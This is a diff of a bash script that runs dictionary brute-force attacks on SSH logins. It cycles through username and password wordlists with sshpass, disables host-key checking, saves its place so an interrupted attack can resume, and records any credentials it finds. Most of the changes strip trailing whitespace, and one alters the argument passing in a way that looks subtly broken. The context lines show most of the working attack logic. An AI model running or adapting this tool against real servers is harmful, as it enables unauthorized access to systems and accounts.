@@ -9,7 +9,7 @@
 
 declare -r START_TIME=$(date +%s.%N)   # Start time of the program
 
-function usage { 
+function usage {
   echo -e "Usage: $0 [OPTIONS]"
   echo "OPTIONS: "
   echo -e "   -a    IP address of SSH server"
@@ -66,7 +66,7 @@ function check_args {
     exit
  else
     echo "$ip" | grep -w "^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}.[0-9]\{1,3\}$" 1>/dev/null
-    [ "$?" -ne 0 ] && echo "'$ip' is not valid IP address, exiting" && usage && exit 
+    [ "$?" -ne 0 ] && echo "'$ip' is not valid IP address, exiting" && usage && exit
  fi
 
  [ -z "$nval" ] && nval=0.1                                                  # Use default value 0.1s if no -n is entered
@@ -89,7 +89,7 @@ function check_args {
  fullpasslist="$passlist"                                                                         #Backup original passlist
  fulluserlist="$userlist"                                                                         #Backup oroginal userlist
 
- # Check SSH connection 
+ # Check SSH connection
  echo -n "Checking SSH connection to '$ip': "
  sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -p "$port" admin@"$ip" exit &>/dev/null; rvalssh="$?"
  if [ "$rvalssh" == 0 ]; then
@@ -102,16 +102,16 @@ function check_args {
  else
     echo "*** OK ***"
  fi
- 
+
 # Read saved username and password from file 01xza01.txt, if file exists read saved credentials from file
     if [ -f "$pthdir/01xza01.txt" ]; then
        lastuser=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f1)
        lastpass=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f2)
        echo "Found file: '$pthdir/01xza01.txt' containig previously saved username: '$lastuser' and password: '$lastpass'"
-       echo "Restoring attack using username '$lastuser' and password '$lastpass'" 
+       echo "Restoring attack using username '$lastuser' and password '$lastpass'"
        row1user=$(grep -wno "^$lastuser$" "$userlist"); rvaluser="$?"
        row1pass=$(grep -wno "^$lastpass$" "$passlist"); rvalpass="$?"
-       
+
        if [ "$rvaluser" == 0 ]; then
           rowuser=$(echo "$row1user" | cut -d ":" -f1)
           tail -n +"$rowuser" "$userlist" > "$userlist"\.new
@@ -122,7 +122,7 @@ function check_args {
          rowpass=$(echo "$row1pass" | cut -d ":" -f1)
          tail -n +"$rowpass" "$passlist" > "$passlist"\.new
          passlist=$(echo "$passlist"\.new)
-       fi 
+       fi
     else
        [ ! -f "$pthdir/01xza01.txt" ] && echo "Warning: Can't find file containing last used username and password in directory '$pthdir', starting from beginning"
     fi
@@ -137,7 +137,7 @@ function parallel_ssh {
  echo "$user":"$pass" > "$pthdir/01xza01.txt"
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$port" "$user"@"$ip" exit &>/dev/null; retval="$?"
  [ "$retval" == 0 ] && echo "*** Found username: '$user' and password: '$pass' ***"  > "$pthdir/x0x901f22result.txt"
-    #   While loop eliminates 'Connection refused' attempts -> retval=255 and 'General runtime error' -> retval=3  
+    #   While loop eliminates 'Connection refused' attempts -> retval=255 and 'General runtime error' -> retval=3
     #   It happens when parameter 'n' is too small
     #   retval must be either 0 -> good password or 5 -> bad password
  while [ "$retval" == 255 -o "$retval" == 3 ]; do
@@ -158,7 +158,7 @@ function launch_attack {
        fi
        sleep $nval
     done < "$passlist"
-    passlist="$fullpasslist"                                                        # Always start search with first pass from dictionary when user is changed 
+    passlist="$fullpasslist"                                                        # Always start search with first pass from dictionary when user is changed
  done < "$userlist"
  evaluate_result
 }
@@ -186,12 +186,12 @@ function evaluate_result {
     if [ -f "$pthdir/x0x901f22result.txt" ]; then                                    # Display found username and password when password is found
        cat "$pthdir/x0x901f22result.txt"
        ellapsed_time
-    else 
-       echo "*** Password not found, use other dictionary ***" 
+    else
+       echo "*** Password not found, use other dictionary ***"
     fi
     [ -f "$inituserlist".new ] && rm "$inituserlist".new                              # delete files $inituserlist.new and $initpasslist.new
-    [ -f "$initpasslist".new ] && rm "$initpasslist".new                              # they're created when interrupted guessing is used   
-    pkill sshpass  
+    [ -f "$initpasslist".new ] && rm "$initpasslist".new                              # they're created when interrupted guessing is used
+    pkill sshpass
 }
 
 function monitor_signal {
@@ -201,11 +201,9 @@ function monitor_signal {
 }
 
 
-### BODY ### 
+### BODY ###
 
-read_args $@
+read_args $"@"
 check_args
 monitor_signal
 launch_attack
-
-
